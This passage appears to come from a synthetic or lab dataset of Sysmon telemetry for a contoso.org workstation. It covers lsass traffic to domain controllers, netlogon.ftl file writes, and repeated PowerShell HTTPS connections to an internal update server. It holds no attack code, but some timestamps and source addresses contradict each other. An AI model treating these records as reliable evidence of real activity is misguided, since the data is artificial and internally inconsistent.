            "event_type": "flow",
            "event_utc": "2020-09-25T17:31:58.308Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "34c288f759026e6b8b9254caf640fe65cde8a2f23e21a345053b69589c3cbbf5",
            "image_path": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 2296,
            "process_guid": "{DD483508-F4D6-5F6C-0000-001059723102}",
            "record_number": "4153009",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.2",
            "src_ipv6": "false",
            "src_port": 63314,
            "subtype": "start",
            "time": "2020-09-25T17:31:48.668Z",
            "timestamp": 1601055108668,
            "transport": "tcp",
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-F4D6-5F6C-0000-001059723102}"
        },
        {
            "action": "start",
            "count": 54,
            "dest_fqdn": "srv-dc-80.contoso.org",
            "dest_hostname": "srv-dc-80",
            "dest_ip": "10.0.0.6",
            "dest_ipv6": "false",
            "dest_port": 88,
            "event_id": "af2efbaf59ec4f526810cd6cf28162a09dc5c8d76e460683c411bcdbdf724c03",
            "event_type": "flow",
            "event_utc": "2020-09-25T17:35:24.764Z",
            "exe": "lsass.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "af2efbaf59ec4f526810cd6cf28162a09dc5c8d76e460683c411bcdbdf724c03",
            "image_path": "C:\\Windows\\System32\\lsass.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4153832",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.2",
            "src_ipv6": "false",
            "src_port": 64108,
            "subtype": "start",
            "time": "2020-09-25T17:35:14.125Z",
            "timestamp": 1601055314125,
            "transport": "tcp",
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "create",
            "creation_time": "2019-02-19 00:26:54.882",
            "event_id": "27ff26a59c477e1607e090449fb2a3aa5a4dba69dbcbeaf24d0229e7ba169df3",
            "event_type": "file",
            "event_utc": "2020-09-25T17:55:02.150Z",
            "exe": "lsass.exe",
            "file_name": "netlogon.ftl",
            "file_path": "C:\\Windows\\System32\\config\\netlogon.ftl",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "27ff26a59c477e1607e090449fb2a3aa5a4dba69dbcbeaf24d0229e7ba169df3",
            "image_path": "C:\\windows\\system32\\lsass.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4158316",
            "subtype": "create",
            "time": "2020-09-25T17:55:02.160Z",
            "timestamp": 1601056502160,
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "create",
            "creation_time": "2019-02-19 00:26:54.882",
            "event_id": "d8100bb57c882b4e3375fd0f65123ef5c0e6085f1633af64563b8a8c31eb9f83",
            "event_type": "file",
            "event_utc": "2020-09-25T18:26:01.918Z",
            "exe": "lsass.exe",
            "file_name": "netlogon.ftl",
            "file_path": "C:\\Windows\\System32\\config\\netlogon.ftl",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "d8100bb57c882b4e3375fd0f65123ef5c0e6085f1633af64563b8a8c31eb9f83",
            "image_path": "C:\\windows\\system32\\lsass.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4164572",
            "subtype": "create",
            "time": "2020-09-25T18:26:01.919Z",
            "timestamp": 1601058361919,
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "create",
            "creation_time": "2019-02-19 00:26:54.882",
            "event_id": "e20ca821b5a4b100587471316f54e1452e8056b28b854d46bb9498e06c35f1a8",
            "event_type": "file",
            "event_utc": "2020-09-25T18:57:02.016Z",
            "exe": "lsass.exe",
            "file_name": "netlogon.ftl",
            "file_path": "C:\\Windows\\System32\\config\\netlogon.ftl",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "e20ca821b5a4b100587471316f54e1452e8056b28b854d46bb9498e06c35f1a8",
            "image_path": "C:\\windows\\system32\\lsass.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4169122",
            "subtype": "create",
            "time": "2020-09-25T18:57:02.021Z",
            "timestamp": 1601060222021,
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "start",
            "count": 0,
            "dest_fqdn": "srv-dc-80.contoso.org",
            "dest_hostname": "srv-dc-80",
            "dest_ip": "10.0.0.6",
            "dest_ipv6": "false",
            "dest_port": 389,
            "event_id": "3ed5367d19bd523cba950712c8657f45a18d5051a57de7c60d0b8b67189f3c54",
            "event_type": "flow",
            "event_utc": "2020-09-25T19:00:16.795Z",
            "exe": "lsass.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "3ed5367d19bd523cba950712c8657f45a18d5051a57de7c60d0b8b67189f3c54",
            "image_path": "C:\\Windows\\System32\\lsass.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4169163",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.1",
            "src_ipv6": "false",
            "src_port": 58224,
            "subtype": "start",
            "time": "2020-09-29T13:21:45.563Z",
            "timestamp": 1601385705563,
            "transport": "udp",
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "terminate",
            "event_id": "e9d25f3dd391887557baa9c36e7697e3f32147844e15c875bc99c1513d92bd3d",
            "event_type": "process",
            "event_utc": "2020-09-29T13:21:47.139Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "e9d25f3dd391887557baa9c36e7697e3f32147844e15c875bc99c1513d92bd3d",
            "image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 1612,
            "process_guid": "{DD483508-FBBB-5F6D-0000-0010C82F3805}",
            "record_number": "4169178",
            "subtype": "terminate",
            "time": "2020-09-29T13:21:47.159Z",
            "timestamp": 1601385707159,
            "uuid": "{DD483508-FBBB-5F6D-0000-0010C82F3805}"
        },
        {
            "action": "create",
            "creation_time": "2019-02-19 00:26:54.882",
            "event_id": "0ef2b3e837baaddbefefcc7aa25c9b77dbddd5e72c6a6a355cca0a5c5bfc2c81",
            "event_type": "file",
            "event_utc": "2020-09-29T13:27:24.825Z",
            "exe": "lsass.exe",
            "file_name": "netlogon.ftl",
            "file_path": "C:\\Windows\\System32\\config\\netlogon.ftl",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "0ef2b3e837baaddbefefcc7aa25c9b77dbddd5e72c6a6a355cca0a5c5bfc2c81",
            "image_path": "C:\\windows\\system32\\lsass.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4169502",
            "subtype": "create",
            "time": "2020-09-29T13:27:24.832Z",
            "timestamp": 1601386044832,
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "start",
            "count": 6382,
            "dest_fqdn": "srv-sft-update-38.contoso.org",
            "dest_hostname": "srv-sft-update-38",
            "dest_ip": "10.0.0.8",
            "dest_ipv6": "false",
            "dest_port": 443,
            "event_id": "1c23805b49107dc28534ad87188e1c39ab37d7bb3fb11589a627f32b8ce6c566",
            "event_type": "flow",
            "event_utc": "2020-09-29T13:51:56.294Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "1c23805b49107dc28534ad87188e1c39ab37d7bb3fb11589a627f32b8ce6c566",
            "image_path": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 3544,
            "process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "record_number": "4171864",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.0",
            "src_ipv6": "false",
            "src_port": 64430,
            "subtype": "start",
            "time": "2020-09-29T13:51:41.420Z",
            "timestamp": 1601387501420,
            "transport": "tcp",
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-E26C-5F6C-0000-0010E0300501}"
        },
        {
            "action": "create",
            "creation_time": "2019-02-19 00:26:54.882",
            "event_id": "2631012ca56dfcbda365d35db3ad5a847e0101ee666fbd33beb646635ef1adb5",
            "event_type": "file",
            "event_utc": "2020-09-29T13:53:00.701Z",
            "exe": "lsass.exe",
            "file_name": "netlogon.ftl",
            "file_path": "C:\\Windows\\System32\\config\\netlogon.ftl",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "2631012ca56dfcbda365d35db3ad5a847e0101ee666fbd33beb646635ef1adb5",
            "image_path": "C:\\windows\\system32\\lsass.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4172011",
            "subtype": "create",
            "time": "2020-09-29T13:53:00.706Z",
            "timestamp": 1601387580706,
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "start",
            "count": 7,
            "dest_fqdn": "srv-dc-11.contoso.org",
            "dest_hostname": "srv-dc-11",
            "dest_ip": "10.0.0.7",
            "dest_ipv6": "false",
            "dest_port": 389,
            "event_id": "6ad710c48ded9116d42b23389da4547135695391037b66a302613c28bbdf9cec",
            "event_type": "flow",
            "event_utc": "2020-09-29T13:53:17.802Z",
            "exe": "lsass.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "6ad710c48ded9116d42b23389da4547135695391037b66a302613c28bbdf9cec",
            "image_path": "C:\\Windows\\System32\\lsass.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4172033",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.0",
            "src_ipv6": "false",
            "src_port": 49504,
            "subtype": "start",
            "time": "2020-09-29T13:53:03.545Z",
            "timestamp": 1601387583545,
            "transport": "udp",
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "start",
            "count": 504,
            "dest_fqdn": "srv-sft-update-38.contoso.org",
            "dest_hostname": "srv-sft-update-38",
            "dest_ip": "10.0.0.8",
            "dest_ipv6": "false",
            "dest_port": 443,
            "event_id": "de0035062718415433b4daee3be16869956e406d0589f8f81006421f9b2d1ca5",
            "event_type": "flow",
            "event_utc": "2020-09-29T13:55:32.811Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "de0035062718415433b4daee3be16869956e406d0589f8f81006421f9b2d1ca5",
            "image_path": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 2296,
            "process_guid": "{DD483508-F4D6-5F6C-0000-001059723102}",
            "record_number": "4172413",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.0",
            "src_ipv6": "false",
            "src_port": 64981,
            "subtype": "start",
            "time": "2020-09-29T13:55:17.719Z",
            "timestamp": 1601387717719,
            "transport": "tcp",
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-F4D6-5F6C-0000-001059723102}"
        },
